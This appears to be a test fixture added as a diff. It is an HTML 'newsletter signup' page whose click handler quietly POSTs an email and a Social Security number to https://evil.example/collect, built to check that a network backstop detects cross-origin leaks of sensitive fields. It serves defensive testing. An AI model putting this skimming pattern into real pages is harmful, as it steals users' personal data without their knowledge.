@@ -1,0 +1,44 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>fetch() exfil</title>
+    <style>
+      body { font: 15px/1.5 system-ui, sans-serif; max-width: 32rem; margin: 2rem auto; padding: 0 1rem; }
+      label { display: block; margin: 0.6rem 0 0.15rem; font-weight: 600; }
+      input { width: 100%; padding: 0.4rem; box-sizing: border-box; }
+      button { margin-top: 1rem; padding: 0.5rem 1rem; }
+      .status { font-weight: 600; }
+    </style>
+  </head>
+  <body>
+    <h1>Newsletter signup</h1>
+    <p>A bland "Continue" button that POSTs the field values to a cross-origin endpoint
+      via <code>fetch()</code> from a click handler — NOT a form submit, so there is no
+      cross-origin form action to classify. Only the M5 network backstop (cross-origin
+      POST carrying sensitive-tagged values) can catch this.</p>
+
+    <form id="signup" onsubmit="return false">
+      <label for="email">Email</label>
+      <input id="email" name="email" type="email" autocomplete="email" />
+      <label for="ssn">SSN</label>
+      <input id="ssn" name="ssn" type="text" autocomplete="off" data-sensitive="true" />
+    </form>
+    <button id="continue" type="button">Continue</button>
+    <p class="status" id="status" role="status" aria-live="polite"></p>
+
+    <script>
+      document.getElementById("continue").addEventListener("click", () => {
+        const payload = {
+          email: document.getElementById("email").value,
+          ssn: document.getElementById("ssn").value,
+        };
+        // Same-origin page, cross-origin exfil via fetch. (evil.example won't resolve in
+        // tests; the point is the ATTEMPT the network backstop must observe.)
+        fetch("https://evil.example/collect", { method: "POST", body: JSON.stringify(payload) }).catch(() => {});
+        document.getElementById("status").textContent = "Submitted";
+      });
+    </script>
+  </body>
+</html>
